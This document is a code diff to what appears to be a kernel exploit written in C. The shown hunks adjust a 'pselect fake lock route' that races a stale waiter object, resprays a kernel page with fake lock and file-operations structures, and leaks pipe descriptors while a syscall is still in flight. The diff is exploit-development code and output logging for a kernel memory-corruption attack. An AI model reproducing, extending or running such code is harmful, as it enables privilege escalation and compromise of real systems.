@@ -16,6 +16,7 @@ int route_last_errno;
  * zc words overlap the stale waiter; zc[0x28] is waiter->task, zc[0x30]
  * waiter->lock. */
 #define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
+/* caps a route that never wins so a lost run does not spend the app timeout */
 #define TCP_ROUTE_ATTEMPTS 128
 #define TCP_ARM_SEQ 16
 #define TCP_POST_GETSOCKOPT_HOLD 20000
@@ -516,12 +517,13 @@ void do_pselect_fake_lock_route(void) {
   int calls = 0;
   int success = 0;
   int winner = 0;
+  int leak_fds = 0;
   for (int attempt = 1; attempt <= attempts; attempt++) {
     if (compact_route && attempt > 1) {
       /* lost race clobbers the page, respray re-derives fake_* too */
       page_base = prepare_good_kernel_page();
       if (!page_base || !fake_lock || !fake_fops) {
-        route_last_step = 34;
+        route_last_step = 35;
         route_last_errno = errno;
         pr_error("pselect retry page prepare failed attempt=%d\n", attempt);
         break;
@@ -639,6 +641,7 @@ void do_pselect_fake_lock_route(void) {
        * syscall still uses, leak and let process exit reclaim them */
       route_last_step = 34;
       pr_error("pselect consumer still inflight, leaking route fds\n");
+      leak_fds = 1;
       break;
     }
     if (block_fd != pipefd[0]) {
@@ -650,8 +653,10 @@ void do_pselect_fake_lock_route(void) {
     }
   }
 
-  close(pipefd[0]);
-  close(pipefd[1]);
+  if (!leak_fds) {
+    close(pipefd[0]);
+    close(pipefd[1]);
+  }
 
   pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
           calls, success, route_last_step, route_last_errno);
